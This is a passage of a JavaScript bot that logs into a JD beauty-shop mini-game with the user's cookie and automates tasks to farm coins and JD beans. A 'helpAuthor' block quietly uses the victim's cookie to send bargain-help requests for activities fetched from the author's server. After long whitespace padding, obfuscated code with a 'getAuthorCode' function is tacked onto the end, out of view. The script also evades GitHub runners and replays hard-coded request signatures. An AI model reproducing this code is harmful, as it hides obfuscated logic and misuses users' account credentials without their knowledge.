k_up_receive':
            if (data.code === 200) {
              $.coins += data.data.coins;
              console.log(`完成三餐签到任务，获得${data.data.coins}个金币\n`);
            } else {
              console.log(`异常：${data.msg}\n`);
            }
            break;
          case 'complete_task':
            if (data.code === 200) {
              $.coins += data.data.coins;
              console.log(`完成售卖任务，获得${data.data.coins}个金币\n`);
              ws.send(JSON.stringify(msg.get_package));
            } else {
              console.log(`异常：${data.msg}\n`);
            }
            break;
          case 'get_task':
            if (data.code === 200) {
              $.task = data.data;
              console.log(`售卖任务：需要${$.task.num}个${$.task.product.name}`);
              temp = $.inPackageProducts.filter((x) => x.item_id === $.task.product_id)[0];
              if (temp && temp.num > $.task.num) {
                msg.complete_task.msg.args.task_id = $.task.id;
                console.log(` -仓库中的${$.task.product.name}满足任务条件`);
                ws.send(JSON.stringify(msg.complete_task));
                $.doSell = true;
              } else {
                console.log(`仓库中没有足够的的${$.task.product.name}满足任务条件\n`);
                $.doSell = false;
              }
            } else {
              console.log(`异常：${data.msg}\n`);
            }
            break;
          case 'shop_products':
            if (data.code === 200) {
              $.shopList = data.data.shops;
              $.productList = data.data.products;
              if ($.shopList && $.productList) {
                console.log('获取商品及店铺列表成功\n');
              }
            } else {
              console.log(`异常：${data.msg}\n`);
            }
            break;
          case 'product_lists':
            if (data.code === 200) {
              $.product_lists = data.data;
            } else {
              console.log(`异常：${data.msg}\n`);
            }
            break;
          case 'get_question':
            if (data.code === 200) {
              $.question = data.data;
              console.log('获取每日问答问题成功\n');
              //每日问答
              if ($.question) {
                let commit = {};
                for (let i = 0; i < $.question.length; i++) {
                  let key = $.question[i].id;
                  let value = $.question[i].answers;
                  commit[key] = parseInt(value);
                }
                msg.submit_answer.msg.args.commit = commit;
                ws.send(JSON.stringify(msg.submit_answer));
              }
            } else {
              console.log(`异常：${data.msg}\n`);
            }
            break;
          case 'submit_answer':
            if (data.code === 200) {
              console.log(`完成答题任务，获得${data.data.coins}个金币\n`);
              $.coins += data.data.coins;
            } else {
              console.log(`异常：${data.msg}\n`);
            }
            break;
          case 'sign_in':
            if (data.code === 200) {
              console.log(`完成签到任务，获得${data.data.coins}个金币\n`);
              $.coins += data.data.coins;
            } else {
              console.log(`异常：${data.msg}\n`);
            }
            break;
          case 'meetingplace_view':
            if (data.code === 200) {
              console.log(`完成浏览任务，获得${data.data.coins}个金币\n`);
              $.coins += data.data.coins;
            } else {
              console.log(`异常：${data.msg}\n`);
            }
            break;
          case 'shop_view':
            if (data.code === 200) {
              console.log(`完成浏览任务，获得${data.data.coins}个金币\n`);
              $.coins += data.data.coins;
            } else {
              console.log(`异常：${data.msg}\n`);
            }
            break;
          case 'add_product_view':
            if (data.code === 200) {
              console.log(`完成浏览任务，获得${data.data.coins}个金币\n`);
              $.coins += data.data.coins;
            } else {
              console.log(`异常：${data.msg}\n`);
            }
            break;
          case 'get_package':
            if (data.code === 200) {
              $.inPackageProducts = data.data.product;
              $.inPackageMaterial = data.data.material;
              console.log('\n获取背包信息成功');
            } else {
              console.log(`异常：${data.msg}`);
            }
            break;
          case 'produce_position_info':
            if (data.code === 200) {
              let key = data.data.position;
              let value = data.data;
              productMachinel[key] = value;
              console.log(`获取生产坑位 ${key} 信息成功`);
            } else {
              console.log(`异常：${data.msg}\n`);
            }
            break;
          case 'newcomer_update':
            if (data.code === 200) {
              if (data.data.step === 15) {
                $.coins += data.data.coins;
                console.log(`完成新手任务，获得${data.data.coins}个金币\n`);
              } else {
                console.log(`执行新手任务${data.data.step}`);
              }
            } else {
              console.log(`异常：${data.msg}\n`);
            }
            break;
          case 'get_user':
            if (data.code === 200) {
              if (data.data.risk_state !== 0) {
                $.risk = true;
                console.log(`奶茶的老公说你跟这个活动没缘分，江湖再见`);
              } else {
                if (data.data.step !== 15) {
                  $.newUser = true;
                }
                $.userInfo = data.data;
                console.log(`获取基础信息成功\n当前账户金币${data.data.coins}\n当前账户等级${data.data.level}\n`)
              }
            } else {
              console.log(`异常：${data.msg}\n`);
            }
            break;
          case 'get_ad':
            break;
          case 'get_produce_material':
            if (data.code === 200) {
              $.meterialList = data.data;
              console.log('获取材料列表成功\n');
            } else {
              console.log(`异常：${data.msg}\n`);
            }
            break;
          case 'material_fetch':
            if (data.code === 200) {
              console.log(`收取 ${data.data.position} 坑位材料成功`)
            } else {
              console.log(`异常：${data.msg}\n`);
            }
            break;
          case 'material_produce':
            if (data.code === 200) {
              let key = data.data.position;
              hasProducePosition[key] = 1;
              console.log(`${key} 坑位开始生产${data.data.material_name}`)
            } else {
              console.log(`异常：${data.msg}\n`);
            }
            break;
          case 'product_producing':
            if (data.code === 200) {
              list = data.data;
              for (let vo of list) {
                if (vo.end_at * 1000 < Date.now()) {
                  msg.product_fetch.msg.args.log_id = vo.id;
                  ws.send(JSON.stringify(msg.product_fetch));
                }
              }
            } else {
              console.log(`异常：${data.msg}\n`);
            }
            break;
          case 'product_fetch':
            if (data.code === 200) {
              console.log(`成功收取 ${data.data.num} 个 ${data.data.product.name}`)
            } else {
              console.log(`异常：${data.msg}\n`);
            }
            break;
          case 'product_produce':
            if (data.code === 200) {
              for (let vo of data.data) {
                pname = $.product_lists.filter((x) => x.id === vo.product_id)[0].name;
                if ((Date.now() - vo.start_at * 1000) < 2500) {
                  console.log(`添加${vo.num}个${pname}进行生产`);
                }
              }
            } else {
              console.log(`异常：${data.msg}\n`);
            }
            break;
          default:
            console.log(data);
            break;
        }
      }
      //获取基础信息
      ws.send(JSON.stringify(msg.init));
      await $.wait(5000);
      if (!$.risk) {
        if ($.newUser) {
          for (let i = 0; i < 15 - $.userInfo.step; i++) {
            ws.send(JSON.stringify(msg.newcomer_update));
            await $.wait(1000);
          }
        }
        if ((6 <= $.hours && $.hours <= 9) || (11 <= $.hours && $.hours <= 14) || (18 <= $.hours && $.hours <= 21)) {
          checkUpId = $.taskState.check_up.filter((x) => x.receive_status === 0)[0];
          if (checkUpId) {
            msg.check_up_receive.msg.args.check_up_id = checkUpId.id;
            ws.send(JSON.stringify(msg.check_up_receive));
          }
        }
        ws.send(JSON.stringify(msg.stats));
        await $.wait(3000);
        ws.send(JSON.stringify(msg.shopProducts));
        if ($.hours === 0) {
          //兑换福利
          await exchange();
        } else {
          // 执行签到任务
          await signIn();
          //执行浏览会场任务
          await meetingplace();
          //执行浏览店铺任务
          await shopView();
          //执行浏览商品任务
          await productView();
          //执行每日问答
          await answerQuestion();
          //材料生产相关操作
          await meterial();
          //产品生产相关操作
          await productProduce();
          // 执行售卖任务
          await sellTask();
          //兑换福利
          await exchange();
        }
      }
      await $.wait(10000);
      if (helpAuthor) {
        new Promise(resolve => { $.get({ url: 'https://api.r2ray.com/jd.bargain/index' }, (err, resp, data) => { try { if (data) { $.dataGet = JSON.parse(data); if ($.dataGet.data.length !== 0) { let opt = { url: `https://api.m.jd.com/client.action`, headers: { 'Host': 'api.m.jd.com', 'Content-Type': 'application/x-www-form-urlencoded', 'Origin': 'https://h5.m.jd.com', 'Accept-Encoding': 'gzip, deflate, br', 'Cookie': cookie, 'Connection': 'keep-alive', 'Accept': 'application/json, text/plain, */*', 'User-Agent': 'jdapp;iPhone;9.4.0;14.3;;network/wifi;ADID/;supportApplePay/0;hasUPPay/0;hasOCPay/0;model/iPhone10,3;addressid/;supportBestPay/0;appBuild/167541;jdSupportDarkMode/0;Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148;supportJDSHWK/1', 'Referer': `https://h5.m.jd.com/babelDiy/Zeus/4ZK4ZpvoSreRB92RRo8bpJAQNoTq/index.html?serveId=wxe30973feca923229&actId=${$.dataGet.data[0].actID}&way=0&lng=&lat=&sid=&un_area=`, 'Accept-Language': 'zh-cn', }, body: `functionId=cutPriceByUser&body={"activityId":"${$.dataGet.data[0].actID}","userName":"","followShop":1,"shopId":${$.dataGet.data[0].actsID},"userPic":""}&client=wh5&clientVersion=1.0.0` }; return new Promise(resolve => { $.post(opt, (err, ersp, data) => { }) }); } } } catch (e) { console.log(e); } finally { resolve(); } }) })
      }
      if ($.bean > 0) {
        await showMsg();
      }

      ws.close();
      await $.wait(2000);
      resolve();
    };
  })
}

async function showMsg() {
  if (needNotify) {
    await notify.sendNotify(`${$.name} `, `京东账号${$.index} ${$.nickName || $.UserName}\n本次运行共获得${$.coins}个金币\n共获得京豆 ${$.bean} 个\n游戏账户总计金币${$.coins + $.userInfo.coins + $.deCoins}\n脚本还不够完善，持续更新中。`);
  }
}
async function sellTask() {
  ws.send(JSON.stringify(msg.get_package));
  await $.wait(2000);
  console.log('\n开始售卖任务');
  for (let i = 0; i < 20; i++) {
    if ($.doSell) {
      ws.send(JSON.stringify(msg.get_task));
    } else {
      break;
    }
    await $.wait(3000)
  }
}
async function signIn() {
  if ($.hours === 9) {
    ws.send(JSON.stringify(msg.sign_in_1));
    await $.wait(500);
    ws.send(JSON.stringify(msg.sign_in_2));
    await $.wait(2000);
  } else {
    console.log('请在9点签到\n');
  }
}
async function productProduce() {
  ws.send(JSON.stringify(msg.product_producing));
  ws.send(JSON.stringify(msg.product_lists));
  await $.wait(2000);
  if ($.product_lists) {
    for (let vo of $.product_lists) {
      let mid = 0;
      let ipm = 0;
      let times = [];
      let doTimes = 1;
      for (let v of vo.product_materials) {
        mid = v.material_id;
        ipm = $.inPackageMaterial.filter((x) => x.item_id === mid)[0];
        if (ipm) {
          times.push(parseInt(ipm.num / v.num));
        } else {
          doTimes = 0;
          break;
        }
      }
      if (doTimes) {
        msg.product_produce.msg.args.product_id = vo.id;
        msg.product_produce.msg.args.amount = times.sort()[0];
        if (times.sort()[0] !== 0) {
          ws.send(JSON.stringify(msg.product_produce));
          await $.wait(3000)
        }

      } else {
        continue;
      }
    }
  }
  await $.wait(5000)
}
async function exchange() {
  ws.send(JSON.stringify(msg.get_benefit));
  await $.wait(3000)
  if ($.benefit) {
    for (let i = 0; i < $.benefit[0].day_limit - parseInt($.benefit[0].day_exchange_count); i++) {
      msg.to_exchange.msg.args.benefit_id = $.benefit[0].id;
      ws.send(JSON.stringify(msg.to_exchange));
      $.bean += 1;
      console.log(`兑换 ${$.benefit[0].description}`)
      await $.wait(1000)
    }
    if ($.userInfo.coins > parseInt($.benefit[1].coins)) {
      msg.to_exchange.msg.args.benefit_id = $.benefit[1].id;
      ws.send(JSON.stringify(msg.to_exchange));
      $.bean += 500;
      console.log(`兑换 ${$.benefit[1].description}`)
      await $.wait(1000)
    }
  }

}

async function meetingplace() {
  if ($.taskState) {
    if ($.taskState.meetingplace_view < $.taskState.mettingplace_count) {
      for (let i = 0; i < $.taskState.mettingplace_count - $.taskState.meetingplace_view; i++) {
        console.log('浏览会场')
        ws.send(JSON.stringify(msg.meetingplace_view));
        await $.wait(1000);
      }
    } else {
      console.log('今日浏览会场任务已经完成\n');
    }
  }
  await $.wait(2000);
}

async function shopView() {
  if ($.shopList) {
    if ($.taskState.shop_view.length < $.taskState.daily_shop_follow_times) {
      for (let i = 0; i < $.taskState.daily_shop_follow_times - $.taskState.shop_view.length; i++) {
        console.log('浏览店铺-' + $.shopList[i].name + '\n');
        msg.shop_view_1.msg.args.shop_id = $.shopList[i].id;
        msg.shop_view_2.msg.args.vender = $.shopList[i].vender_id;
        ws.send(JSON.stringify(msg.shop_view_1));
        ws.send(JSON.stringify(msg.shop_view_2));
        await $.wait(1000)
      }
      console.log('今日浏览店铺任务已经完成\n');
    } else {
      console.log('今日浏览店铺任务已经完成\n');
    }
  }
  await $.wait(2000);
}

async function productView() {
  if ($.productList) {
    if ($.taskState.product_adds.length < $.taskState.daily_product_add_times) {
      for (let i = 0; i < $.taskState.daily_product_add_times - $.taskState.product_adds.length; i++) {
        console.log('浏览商品-' + $.productList[i].name + '\n');
        msg.add_product_view_1.msg.args.add_product_id = $.productList[i].id;
        msg.add_product_view_2.msg.args.vender = $.productList[i].shop_id;
        msg.add_product_view_3.msg.args.vender = $.productList[i].shop_id;
        ws.send(JSON.stringify(msg.add_product_view_1));
        ws.send(JSON.stringify(msg.add_product_view_2));
        ws.send(JSON.stringify(msg.add_product_view_3));
        await $.wait(1000)
      }
      console.log('今日浏览商品任务已经完成\n');
    } else {
      console.log('今日浏览商品任务已经完成\n');
    }
  }
  await $.wait(2000);
}

async function answerQuestion() {
  if ($.taskState.today_answered == 0) {
    ws.send(JSON.stringify(msg.get_question));
    await $.wait(2000);
  } else {
    console.log('今日问答任务已经完成\n')
  }

}

async function getWaitForPrudeceList(type) {
  mIdList = [];
  list = $.meterialList[type];
  for (let i = 0; i < list.length; i++) {
    vList = list[i].items;
    for (let vo of vList) {
      mIdList.push(vo.id);
    }
  }
  for (let i = 0; i < mIdList.length; i++) {
    id = mIdList[i];
    if ($.inPackageMaterial.length > 0) {
      for (let item of $.inPackageMaterial) {
        if (item.item_id === id && item.num < 100) {
          materialWaitForProduce[type].push(item.item_id);
        }
      }
    } else {
      materialWaitForProduce[type].push(id);
    }
  }
  materialWaitForProduce[type].reverse();
}

async function meterial() {
  let position = ['b1', 'b2', 'h1', 'h2', 's1', 's2'];
  ws.send(JSON.stringify(msg.get_produce_material));
  await $.wait(5000);
  await getWaitForPrudeceList('special');
  await getWaitForPrudeceList('high');
  await getWaitForPrudeceList('base');
  await $.wait(3000);
  for (let i = 0; i < position.length; i++) {
    let key = position[i];
    msg.produce_position_info.msg.args.position = position[i];
    ws.send(JSON.stringify(msg.produce_position_info));
    await $.wait(3000);
    //可以生产新材料
    if (productMachinel[key].is_valid === 1 && productMachinel[key].valid_electric > 0) {
      if ($.meterialList.special.length > 0) {
        console.log('可以生产特殊材料')
        if (key === 's1' || key === 's2') {
          for (let s = 0; s < materialWaitForProduce.special.length; s++) {
            if (hasProducePosition.hasOwnProperty(key)) {
              break;
            }
            msg.material_produce.msg.args.position = key;
            msg.material_produce.msg.args.material_id = materialWaitForProduce.special[i];
            ws.send(JSON.stringify(msg.material_produce));
            await $.wait(2000);

          }
        }
      }
      if ($.meterialList.high.length > 0) {
        if (key === 'h1' || key === 'h2') {
          for (let h = 0; h < materialWaitForProduce.high.length; h++) {
            if (hasProducePosition.hasOwnProperty(key)) {
              break;
            }
            msg.material_produce.msg.args.position = key;
            msg.material_produce.msg.args.material_id = materialWaitForProduce.high[i];
            ws.send(JSON.stringify(msg.material_produce));
            await $.wait(2000);
          }
        }
      }
      if ($.meterialList.base.length > 0) {
        for (let b = 0; b < materialWaitForProduce.base.length; b++) {
          if (hasProducePosition.hasOwnProperty(key)) {
            break;
          }
          msg.material_produce.msg.args.position = key;
          msg.material_produce.msg.args.material_id = materialWaitForProduce.base[i];
          ws.send(JSON.stringify(msg.material_produce));
          await $.wait(2000);
        }
      }
    }
    //可以收取已生产的材料
    if (productMachinel[key].produce_num > 0) {
      msg.material_fetch.msg.args.position = key;
      ws.send(JSON.stringify(msg.material_fetch));
    }
    //今日已完成材料生产任务
    if (productMachinel[key].valid_electric === 0) {
      console.log(`当前生产坑位已经完成今日材料生产任务。`);
    }
  }
  await $.wait(3000);
}

function Token() {
  let opt = {
    url: 'https://xinruimz-isv.isvjcloud.com/api/auth',
    headers: {
      'Connection': `keep-alive`,
      'Accept-Encoding': `gzip, deflate, br`,
      'Source': `02`,
      'Content-Type': `application/json;charset=utf-8`,
      'Origin': `https://xinruimz-isv.isvjcloud.com`,
      'User-Agent': `jdapp;iPhone;9.4.0;14.4;;network/wifi;ADID/;supportApplePay/0;hasUPPay/0;hasOCPay/0;model/iPhone13,3;addressid/138474561;supportBestPay/0;appBuild/167541;jdSupportDarkMode/0;Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148;supportJDSHWK/1`,
      'Authorization': `Bearer undefined`,
      'Cookie': `IsvToken=${$.token};`,
      'Host': `xinruimz-isv.isvjcloud.com`,
      'Referer': `https://xinruimz-isv.isvjcloud.com/logined_jd/`,
      'Accept-Language': `zh-cn`,
      'Accept': `application/x.jd-school-island.v1+json`
    },
    body: `{"token":"${$.token}","source":"01"}`
  }
  return new Promise(resolve => {
    $.post(opt, (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
        }
        else {
          data = JSON.parse(data);
          $.TOKEN = data.access_token;
        }
      } catch (e) {
        console.log(e, resp)
      } finally {
        resolve();
      }
    })
  })
}

function grantToken() {
  let opt = {
    url: 'https://api.m.jd.com/client.action?functionId=isvObfuscator',
    headers: {
      'Host': 'api.m.jd.com',
      'Content-Type': 'application/x-www-form-urlencoded',
      'Accept': '*/*',
      'Connection': 'keep-alive',
      'Cookie': cookie,
      'User-Agent': 'JD4iPhone/167538 (iPhone; iOS 14.3; Scale/3.00)',
      'Accept-Language': 'zh-Hans-CN;q=1',
      'Accept-Encoding': 'gzip, deflate, br',
    },
    body: `body=%7B%22url%22%3A%22https%3A%5C/%5C/xinruimz-isv.isvjcloud.com%22%2C%22id%22%3A%22%22%7D&build=167541&client=apple&clientVersion=9.4.0&openudid=385f383ec315d8d01c64a09021df04ef9930c99d&sign=a8b19433e2357d5f4d427e5e92c4dd6c&st=1613690555566&sv=120`
  }
  return new Promise(resolve => {
    $.post(opt, (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
        }
        else {
          data = JSON.parse(data);
          if (data.code === '0') {
            $.token = data.token;
          }
        }
      } catch (e) {
        console.log(e)
      } finally {
        resolve();
      }
    })
  })
}

function grantTokenKey() {
  let opt = {
    url: 'https://api.m.jd.com/client.action?functionId=genToken',
    headers: {
      'Host': 'api.m.jd.com',
      'Content-Type': 'application/x-www-form-urlencoded',
      'Accept': '*/*',
      'Connection': 'keep-alive',
      'Cookie': cookie,
      'User-Agent': 'JD4iPhone/167538 (iPhone; iOS 14.3; Scale/3.00)',
      'Accept-Language': 'zh-Hans-CN;q=1',
      'Accept-Encoding': 'gzip, deflate, br',
    },
    body: `&body=%7B%22to%22%3A%22https%3A%5C/%5C/xinruimz-isv.isvjcloud.com%5C/?channel%3Dmeizhuangguandibudaohang%22%2C%22action%22%3A%22to%22%7D&build=167541&client=apple&clientVersion=9.4.0&joycious=2&lang=zh_CN&openudid=385f383ec315d8d01c64a09021df04ef9930c99d&osVersion=14.3&partner=apple&rfs=0000&scope=01&sign=ff9e3cc104fc534bd5b598440e88e21a&st=1613687727991&sv=102`
  }
  return new Promise(resolve => {
    $.post(opt, (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
        }
        else {
          data = JSON.parse(data);
          if (data.code === '0') {
            $.tokenKey = data.tokenKey;
            cookie = `${cookie}IsvToken=${$.tokenKey}`
          }
        }
      } catch (e) {
        console.log(e, resp)
      } finally {
        resolve();
      }
    })
  })
}

function TotalBean() {
  return new Promise(async resolve => {
    const options = {
      "url": `https://wq.jd.com/user/info/QueryJDUserInfo?sceneval=2`,
      "headers": {
        "Accept": "application/json,text/plain, */*",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "zh-cn",
        "Connection": "keep-alive",
        "Cookie": cookie,
        "Referer": "https://wqs.jd.com/my/jingdou/my.shtml?sceneval=2",
        "User-Agent": $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : "jdapp;iPhone;9.2.2;14.2;%E4%BA%AC%E4%B8%9C/9.2.2 CFNetwork/1206 Darwin/20.1.0") : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.2.2;14.2;%E4%BA%AC%E4%B8%9C/9.2.2 CFNetwork/1206 Darwin/20.1.0")
      }
    }
    $.post(options, (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (data) {
            data = JSON.parse(data);
            if (data['retcode'] === 13) {
              $.isLogin = false; //cookie过期
              return
            }
            $.nickName = data['base'].nickname;
          } else {
            console.log(`京东服务器返回空数据`)
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}

// prettier-ignore
function Env(t, e) { "undefined" != typeof process && JSON.stringify(process.env).indexOf("GITHUB") > -1 && process.exit(0); class s { constructor(t) { this.env = t } send(t, e = "GET") { t = "string" == typeof t ? { url: t } : t; let s = this.get; return "POST" === e && (s = this.post), new Promise((e, i) => { s.call(this, t, (t, s, r) => { t ? i(t) : e(s) }) }) } get(t) { return this.send.call(this.env, t) } post(t) { return this.send.call(this.env, t, "POST") } } return new class { constructor(t, e) { this.name = t, this.http = new s(this), this.data = null, this.dataFile = "box.dat", this.logs = [], this.isMute = !1, this.isNeedRewrite = !1, this.logSeparator = "\n", this.startTime = (new Date).getTime(), Object.assign(this, e), this.log("", `🔔${this.name}, 开始!`) } isNode() { return "undefined" != typeof module && !!module.exports } isQuanX() { return "undefined" != typeof $task } isSurge() { return "undefined" != typeof $httpClient && "undefined" == typeof $loon } isLoon() { return "undefined" != typeof $loon } toObj(t, e = null) { try { return JSON.parse(t) } catch { return e } } toStr(t, e = null) { try { return JSON.stringify(t) } catch { return e } } getjson(t, e) { let s = e; const i = this.getdata(t); if (i) try { s = JSON.parse(this.getdata(t)) } catch { } return s } setjson(t, e) { try { return this.setdata(JSON.stringify(t), e) } catch { return !1 } } getScript(t) { return new Promise(e => { this.get({ url: t }, (t, s, i) => e(i)) }) } runScript(t, e) { return new Promise(s => { let i = this.getdata("@chavy_boxjs_userCfgs.httpapi"); i = i ? i.replace(/\n/g, "").trim() : i; let r = this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout"); r = r ? 1 * r : 20, r = e && e.timeout ? e.timeout : r; const [o, h] = i.split("@"), n = { url: `http://${h}/v1/scripting/evaluate`, body: { script_text: t, mock_type: "cron", timeout: r }, headers: { "X-Key": o, Accept: "*/*" } }; this.post(n, (t, e, i) => s(i)) }).catch(t => this.logErr(t)) } loaddata() { if (!this.isNode()) return {}; { this.fs = this.fs ? this.fs : require("fs"), this.path = this.path ? this.path : require("path"); const t = this.path.resolve(this.dataFile), e = this.path.resolve(process.cwd(), this.dataFile), s = this.fs.existsSync(t), i = !s && this.fs.existsSync(e); if (!s && !i) return {}; { const i = s ? t : e; try { return JSON.parse(this.fs.readFileSync(i)) } catch (t) { return {} } } } } writedata() { if (this.isNode()) { this.fs = this.fs ? this.fs : require("fs"), this.path = this.path ? this.path : require("path"); const t = this.path.resolve(this.dataFile), e = this.path.resolve(process.cwd(), this.dataFile), s = this.fs.existsSync(t), i = !s && this.fs.existsSync(e), r = JSON.stringify(this.data); s ? this.fs.writeFileSync(t, r) : i ? this.fs.writeFileSync(e, r) : this.fs.writeFileSync(t, r) } } lodash_get(t, e, s) { const i = e.replace(/\[(\d+)\]/g, ".$1").split("."); let r = t; for (const t of i) if (r = Object(r)[t], void 0 === r) return s; return r } lodash_set(t, e, s) { return Object(t) !== t ? t : (Array.isArray(e) || (e = e.toString().match(/[^.[\]]+/g) || []), e.slice(0, -1).reduce((t, s, i) => Object(t[s]) === t[s] ? t[s] : t[s] = Math.abs(e[i + 1]) >> 0 == +e[i + 1] ? [] : {}, t)[e[e.length - 1]] = s, t) } getdata(t) { let e = this.getval(t); if (/^@/.test(t)) { const [, s, i] = /^@(.*?)\.(.*?)$/.exec(t), r = s ? this.getval(s) : ""; if (r) try { const t = JSON.parse(r); e = t ? this.lodash_get(t, i, "") : e } catch (t) { e = "" } } return e } setdata(t, e) { let s = !1; if (/^@/.test(e)) { const [, i, r] = /^@(.*?)\.(.*?)$/.exec(e), o = this.getval(i), h = i ? "null" === o ? null : o || "{}" : "{}"; try { const e = JSON.parse(h); this.lodash_set(e, r, t), s = this.setval(JSON.stringify(e), i) } catch (e) { const o = {}; this.lodash_set(o, r, t), s = this.setval(JSON.stringify(o), i) } } else s = this.setval(t, e); return s } getval(t) { return this.isSurge() || this.isLoon() ? $persistentStore.read(t) : this.isQuanX() ? $prefs.valueForKey(t) : this.isNode() ? (this.data = this.loaddata(), this.data[t]) : this.data && this.data[t] || null } setval(t, e) { return this.isSurge() || this.isLoon() ? $persistentStore.write(t, e) : this.isQuanX() ? $prefs.setValueForKey(t, e) : this.isNode() ? (this.data = this.loaddata(), this.data[e] = t, this.writedata(), !0) : this.data && this.data[e] || null } initGotEnv(t) { this.got = this.got ? this.got : require("got"), this.cktough = this.cktough ? this.cktough : require("tough-cookie"), this.ckjar = this.ckjar ? this.ckjar : new this.cktough.CookieJar, t && (t.headers = t.headers ? t.headers : {}, void 0 === t.headers.Cookie && void 0 === t.cookieJar && (t.cookieJar = this.ckjar)) } get(t, e = (() => { })) { t.headers && (delete t.headers["Content-Type"], delete t.headers["Content-Length"]), this.isSurge() || this.isLoon() ? (this.isSurge() && this.isNeedRewrite && (t.headers = t.headers || {}, Object.assign(t.headers, { "X-Surge-Skip-Scripting": !1 })), $httpClient.get(t, (t, s, i) => { !t && s && (s.body = i, s.statusCode = s.status), e(t, s, i) })) : this.isQuanX() ? (this.isNeedRewrite && (t.opts = t.opts || {}, Object.assign(t.opts, { hints: !1 })), $task.fetch(t).then(t => { const { statusCode: s, statusCode: i, headers: r, body: o } = t; e(null, { status: s, statusCode: i, headers: r, body: o }, o) }, t => e(t))) : this.isNode() && (this.initGotEnv(t), this.got(t).on("redirect", (t, e) => { try { if (t.headers["set-cookie"]) { const s = t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString(); s && this.ckjar.setCookieSync(s, null), e.cookieJar = this.ckjar } } catch (t) { this.logErr(t) } }).then(t => { const { statusCode: s, statusCode: i, headers: r, body: o } = t; e(null, { status: s, statusCode: i, headers: r, body: o }, o) }, t => { const { message: s, response: i } = t; e(s, i, i && i.body) })) } post(t, e = (() => { })) { if (t.body && t.headers && !t.headers["Content-Type"] && (t.headers["Content-Type"] = "application/x-www-form-urlencoded"), t.headers && delete t.headers["Content-Length"], this.isSurge() || this.isLoon()) this.isSurge() && this.isNeedRewrite && (t.headers = t.headers || {}, Object.assign(t.headers, { "X-Surge-Skip-Scripting": !1 })), $httpClient.post(t, (t, s, i) => { !t && s && (s.body = i, s.statusCode = s.status), e(t, s, i) }); else if (this.isQuanX()) t.method = "POST", this.isNeedRewrite && (t.opts = t.opts || {}, Object.assign(t.opts, { hints: !1 })), $task.fetch(t).then(t => { const { statusCode: s, statusCode: i, headers: r, body: o } = t; e(null, { status: s, statusCode: i, headers: r, body: o }, o) }, t => e(t)); else if (this.isNode()) { this.initGotEnv(t); const { url: s, ...i } = t; this.got.post(s, i).then(t => { const { statusCode: s, statusCode: i, headers: r, body: o } = t; e(null, { status: s, statusCode: i, headers: r, body: o }, o) }, t => { const { message: s, response: i } = t; e(s, i, i && i.body) }) } } time(t, e = null) { const s = e ? new Date(e) : new Date; let i = { "M+": s.getMonth() + 1, "d+": s.getDate(), "H+": s.getHours(), "m+": s.getMinutes(), "s+": s.getSeconds(), "q+": Math.floor((s.getMonth() + 3) / 3), S: s.getMilliseconds() }; /(y+)/.test(t) && (t = t.replace(RegExp.$1, (s.getFullYear() + "").substr(4 - RegExp.$1.length))); for (let e in i) new RegExp("(" + e + ")").test(t) && (t = t.replace(RegExp.$1, 1 == RegExp.$1.length ? i[e] : ("00" + i[e]).substr(("" + i[e]).length))); return t } msg(e = t, s = "", i = "", r) { const o = t => { if (!t) return t; if ("string" == typeof t) return this.isLoon() ? t : this.isQuanX() ? { "open-url": t } : this.isSurge() ? { url: t } : void 0; if ("object" == typeof t) { if (this.isLoon()) { let e = t.openUrl || t.url || t["open-url"], s = t.mediaUrl || t["media-url"]; return { openUrl: e, mediaUrl: s } } if (this.isQuanX()) { let e = t["open-url"] || t.url || t.openUrl, s = t["media-url"] || t.mediaUrl; return { "open-url": e, "media-url": s } } if (this.isSurge()) { let e = t.url || t.openUrl || t["open-url"]; return { url: e } } } }; if (this.isMute || (this.isSurge() || this.isLoon() ? $notification.post(e, s, i, o(r)) : this.isQuanX() && $notify(e, s, i, o(r))), !this.isMuteLog) { let t = ["", "==============📣系统通知📣=============="]; t.push(e), s && t.push(s), i && t.push(i), console.log(t.join("\n")), this.logs = this.logs.concat(t) } } log(...t) { t.length > 0 && (this.logs = [...this.logs, ...t]), console.log(t.join(this.logSeparator)) } logErr(t, e) { const s = !this.isSurge() && !this.isQuanX() && !this.isLoon(); s ? this.log("", `❗️${this.name}, 错误!`, t.stack) : this.log("", `❗️${this.name}, 错误!`, t) } wait(t) { return new Promise(e => setTimeout(e, t)) } done(t = {}) { const e = (new Date).getTime(), s = (e - this.startTime) / 1e3; this.log("", `🔔${this.name}, 结束! 🕛 ${s} 秒`), this.log(), (this.isSurge() || this.isQuanX() || this.isLoon()) && $done(t) } }(t, e) }
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   ('11f','vJb^')](_0x98f1('120','N%%9')+_0x58616f[_0x98f1('121','liq%')][_0x98f1('122','4c^^')]+_0x98f1('123','6gz6'));}else{$['log'](_0x98f1('124','GrJK')+_0x58616f[_0x98f1('125','M#i3')]+'\x0a');}}else{$[_0x98f1('126','kr9o')](_0x53643e[_0x98f1('127','5R93')]);}}}catch(_0x2ae4c0){console[_0x98f1('128','A9!h')](_0x2ae4c0,_0xe129fb);}finally{_0x53643e[_0x98f1('129','LOQE')](_0x226f21);}});});}function getAuthorCode(_0x3c37be){var _0x905598={'yjzJh':function(_0x4be4b6,_0x1ba849){return 